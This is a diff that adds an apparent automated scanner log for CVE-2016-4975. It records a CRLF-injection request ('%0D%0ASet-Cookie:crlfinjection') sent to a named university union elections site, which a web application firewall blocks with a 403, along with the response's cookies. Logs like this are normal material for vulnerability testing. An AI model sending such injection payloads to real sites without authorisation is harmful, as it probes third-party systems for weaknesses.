@@ -1,0 +1,25 @@
+[CVE-2016-4975] Dumped HTTP request for https://elections.union.unimelb.edu.au/~user/%0D%0ASet-Cookie:crlfinjection
+
+
+GET /~user/%0D%0ASet-Cookie:crlfinjection HTTP/1.1
+Host: elections.union.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Accept: */*
+Accept-Language: en
+Accept-Encoding: gzip
+
+
+[CVE-2016-4975] Dumped HTTP response https://elections.union.unimelb.edu.au/~user/%0D%0ASet-Cookie:crlfinjection
+
+HTTP/1.1 403 Forbidden
+Connection: close
+Content-Length: 831
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Set-Cookie: visid_incap_3220071=vfm0nPJuTTuucMOp5GXtOwtyk2gAAAAAQUIPAAAAAABNqJv4ipirDUdApkAhVB+n; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Set-Cookie: incap_ses_237_3220071=gGMkPwLXLT8W57arov5JAwtyk2gAAAAA5w90k/lkozr6Ksj0POqlDg==; path=/; Domain=.union.unimelb.edu.au; Secure; SameSite=None
+Strict-Transport-Security: max-age=31536000
+X-Iinfo: 5-4041374-0 0NNN RT(1754493451429 39) q(0 -1 -1 -1) r(0 -1) B15(3,901872,0) U24
+
+<html style="height:100%"><head><META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW"><meta name="format-detection" content="telephone=no"><meta name="viewport" content="initial-scale=1.0"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script src="/alband-Then-now-not-by-the-wortune-Vpon-his-Fee-" async></script></head><body style="margin:0px;height:100%"><iframe id="main-iframe" src="/_Incapsula_Resource?CWUDNSAI=23&xinfo=5-4041374-0%200NNN%20RT%281754493451429%2039%29%20q%280%20-1%20-1%20-1%29%20r%280%20-1%29%20B15%283%2c901872%2c0%29%20U24&incident_id=237000430032586535-21069597741222597&edet=15&cinfo=03000000&rpinfo=0&mth=GET" frameborder=0 width="100%" height="100%" marginheight="0px" marginwidth="0px">Request unsuccessful. Incapsula incident ID: 237000430032586535-21069597741222597</iframe></body></html>
